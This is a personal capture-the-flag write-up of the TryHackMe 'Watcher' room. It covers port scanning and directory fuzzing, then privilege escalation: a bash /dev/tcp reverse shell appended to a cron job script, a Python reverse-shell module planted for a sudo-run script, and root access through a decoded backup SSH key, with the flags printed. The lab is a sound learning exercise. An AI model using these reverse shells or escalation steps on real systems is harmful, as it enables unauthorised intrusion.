---
title: "Watcher"
kind: writeup
tags:
  - tryhackme-rooms
  - status/done
  - writeup
  - linux
  - web
  - challenege
status: "Done"
difficulty: "Medium"
url: "https://tryhackme.com/room/watcher"
category:
  - "Challenege"
database: "TryHackMe"
area: "TryHackMe Rooms"
up: "[[TryHackMe]]"
notion-id: 0f3759b927518330aad001a023f4de87
---

# Watcher

In: [[Career]] / [[TryHackMe Rooms]] / [[TryHackMe]]

## Nmap Scan

```bash
┌──(kali㉿Shieldbyte53)-[~/nmap]
└─$ nmap -p- --min-rate 1000 -T4 -sV -Pn -oA nmap_full_scan 10.48.148.109
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 11:50 IST
Nmap scan report for 10.48.148.109
Host is up (0.016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.35 seconds
```

## Fuzzing Directories

```bash
┌──(kali㉿Shieldbyte53)-[~/nmap]
└─$ ffuf -u "http://10.48.148.109/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r --recursion

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.148.109/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 12ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 13ms]
css                     [Status: 200, Size: 1168, Words: 70, Lines: 18, Duration: 543ms]
images                  [Status: 200, Size: 1360, Words: 82, Lines: 19, Duration: 11ms]
robots.txt              [Status: 200, Size: 69, Words: 4, Lines: 4, Duration: 14ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 9ms]
:: Progress: [20481/20481] :: Job [1/1] :: 3508 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

![[attachments/TryHackMe Rooms/TryHackMe/Watcher/image.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Watcher/image 1.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Watcher/image 2.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Watcher/image 3.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Watcher/image 4.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Watcher/image 5.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Watcher/image 6.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Watcher/image 7.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Watcher/image 8.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Watcher/image 9.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Watcher/image 10.png]]

```bash
toby@ip-10-48-183-33:~/jobs$ echo "bash -i >& /dev/tcp/192.168.158.240/4445 0>&1" >> /home/toby/jobs/cow.sh
toby@ip-10-48-183-33:~/jobs$ cat cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
bash -i >& /dev/tcp/92.168.158.240/4445 0>&1
bash -i >& /dev/tcp/192.168.158.240/4445 0>&1
toby@ip-10-48-183-33:~/jobs$
```

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [192.168.158.240] from (UNKNOWN) [10.48.183.33] 54894
bash: cannot set terminal process group (3455): Inappropriate ioctl for device
bash: no job control in this shell

mat@ip-10-48-183-33:~$ ls
cow.jpg  flag_5.txt  note.txt  scripts

mat@ip-10-48-183-33:~$ cat flag_5.txt
FLAG{live_by_the_cow_die_by_the_cow}

```

```bash
mat@ip-10-48-183-33:~/scripts$ echo 'import socket,subprocess,os
def get_command(num):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.158.240",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])' > /home/mat/scripts/cmd.py
mat@ip-10-48-183-33:~/scripts$ cat /home/mat/scripts/cmd.py
import socket,subprocess,os
def get_command(num):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.158.240",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])
mat@ip-10-48-183-33:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```

```bash
will@ip-10-48-183-33:~$ cd
will@ip-10-48-183-33:~$ ls
flag_6.txt
will@ip-10-48-183-33:~$ cat flag_6.txt
FLAG{but_i_thought_my_script_was_secure}
will@ip-10-48-183-33:~$ whoami
will
```

```bash
will@ip-10-48-183-33:~$ find /home -name "key" 2>/dev/null
will@ip-10-48-183-33:~$ cd /opt
will@ip-10-48-183-33:/opt$ ls
backups
will@ip-10-48-183-33:/opt$ cd backups
will@ip-10-48-183-33:/opt/backups$ ls
key.b64
will@ip-10-48-183-33:/opt/backups$ cat key.b64 | base64 -d > /tmp/id_rsa
will@ip-10-48-183-33:/opt/backups$ chmod 600 /tmp/id_rsa
will@ip-10-48-183-33:/opt/backups$ ssh -i /tmp/id_rsa root@10.48.183.33
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
root@ip-10-48-183-33:~# ls
flag_7.txt  snap
root@ip-10-48-183-33:~# cat flag_7.txt
FLAG{who_watches_the_watchers}
root@ip-10-48-183-33:~#
```
